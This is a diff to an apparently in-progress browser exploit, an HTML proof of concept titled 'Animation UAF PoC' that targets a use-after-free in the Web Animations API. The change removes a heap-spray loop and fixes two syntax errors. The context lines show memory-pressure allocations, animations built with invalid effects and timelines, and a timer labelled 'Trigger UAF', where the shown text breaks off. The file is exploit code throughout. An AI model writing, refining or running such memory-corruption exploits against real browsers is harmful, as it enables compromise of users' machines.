@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Animation UAF PoC v2</title>
+    <title>Animation UAF PoC v3</title>
 </head>
 <body>
     <div id="target"></div>
@@ -14,14 +14,6 @@
             for (let i = 0; i < 200; i++) {
                 new ArrayBuffer(2 * 1024 * 1024);
             }
-        }
-
-        // Heap spray
-        const spray = [];
-        for (let i = 0; i < 1500; i++) {
-            const buf = new Uint8Array(1024 * 1024);
-            buf.fill(0x41);
-            spray.push(buf);
         }
 
         // Create animations
@@ -36,12 +28,12 @@
         try {
             const invalidEffect = new KeyframeEffect(target, null, { duration: 0 });
             animations.push(new Animation(invalidEffect, document.timeline));
-        } catch (e] {}
+        } catch (e) {}
         // Add invalid timeline
         try {
             const invalidTimeline = { currentTime: null };
             animations.push(new Animation(new KeyframeEffect(target, keyframes, { duration: 1000 }), invalidTimeline));
-        } catch (e] {}
+        } catch (e) {}
 
         // Trigger UAF
         setInterval(() => {
